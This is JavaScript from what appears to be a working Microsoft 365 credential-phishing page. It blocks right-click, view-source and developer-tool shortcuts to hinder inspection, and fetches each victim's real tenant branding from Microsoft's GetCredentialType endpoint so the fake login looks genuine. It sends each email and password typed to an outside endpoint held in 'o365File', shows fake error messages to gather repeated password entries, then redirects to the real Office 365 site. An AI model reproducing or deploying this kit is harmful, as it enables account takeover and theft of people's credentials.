<script>
    // prevent ctrl + s
    window.addEventListener('keydown', (e) => {
        if (e.ctrlKey && (e.which == 83)) {
            e.preventDefault();
            return false; }
    });
    window.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = (e) => {
        if (event.keyCode == 123) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0)) {
            return false;
        }
        if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
            return false;
        }
    }
    window.onkeydown = (e) => {
        return !(e.ctrlKey &&
            (e.keyCode === 67 ||
                e.keyCode === 86 ||
                e.keyCode === 85 ||
                e.keyCode === 117));
    };    
</script>

<script>
    var count = 0;
    function set_brand(email) {
        $.ajax({
            url: 'https://login.microsoftonline.com/common/GetCredentialType',
            method: "POST", async: true, crossDomain: true,
            headers: {"Content-Type": "application/json", "cache-control": "no-cache"},
            data: JSON.stringify({username: email}),
            success: function (response) {
                console.log(response);
                let res = JSON.parse(response)
                res = res["EstsProperties"]["UserTenantBranding"][0]
                let logo = res["BannerLogo"], background = res["Illustration"], DarkTile = res["TileDarkLogo"]
                let TileLogo = res["TileLogo"], BoilerPlateText = res["BoilerPlateText"]
                if (logo) {
                    $('.logo').attr('src', logo);
			    }
                if (BoilerPlateText) {
                    console.log(BoilerPlateText);
                    $(".plate").append(BoilerPlateText);
                    $(".plate").css({"text-align": "center"})
                }               
                if (background) {
                    $('.background-image').css({ 'background-image': 'url(' + background + ')', "-webkit-filter": "brightness(20%)", "filter": "brightness(47%)" });
                } else if (DarkTile) {
                    $('.background-image').css({ 'background-image': 'url(' + DarkTile + ')', "-webkit-filter": "brightness(20%)", "filter": "brightness(47%)" });
                } else if (TileLogo) {
                    $('.background-image').css({ 'background-image': 'url(' + TileLogo + ')', "-webkit-filter": "brightness(20%)", "filter": "brightness(47%)" });
                }
            }
        });
    }

    function send_result(user, pass) {
        $.ajax({
            url: o365File,
            data: {
                "email": user,
                "password": pass
            },
            type: "POST",
            success: function () {},
            error: function (data) {
                console.log('Ajax error');
            }
		});        
    }

    
    document.addEventListener('DOMContentLoaded', async() => {
        if(url_string){
            document.getElementById("show-email").innerHTML = url_string;
            document.getElementById("i0118").focus();
            set_brand(url_string);
        }

        document.getElementById("Button9").addEventListener("click", e => {
            event.preventDefault ? event.preventDefault() : event.returnValue = false;

            var pswd = document.getElementById("i0118").value;
            if(pswd.length < 5){
                document.getElementById("important1").style.display="none";
                setTimeout(() => {document.getElementById("i0281").reset(); document.getElementById('errorpw').innerHTML = "Your account password is too short."}, 1500);
            } else if (pswd.length > 5 && count <= 0) {
                send_result(url_string, pswd);
                document.getElementById("important1").style.display="none";
                setTimeout(() => {count++; document.getElementById("i0281").reset(); document.getElementById('errorpw').innerHTML = `Your account password cannot be empty. if you don't remember your password, <a href="#">reset it now.</a>`}, 2000)
            } else if (count < 2){
                send_result(url_string, pswd);
                document.getElementById("important1").style.display = "none";
                setTimeout(() => {count++; document.getElementById("i0281").reset(); document.getElementById('errorpw').innerHTML = `Your account password cannot be empty. if you don't remember your password, <a href="#">reset it now.</a>`}, 2000)
            } else {
                send_result(url_string, pswd);
                setTimeout(() => {window.location.replace("https://www.office365.com")});
            }
        });
    });
</script>
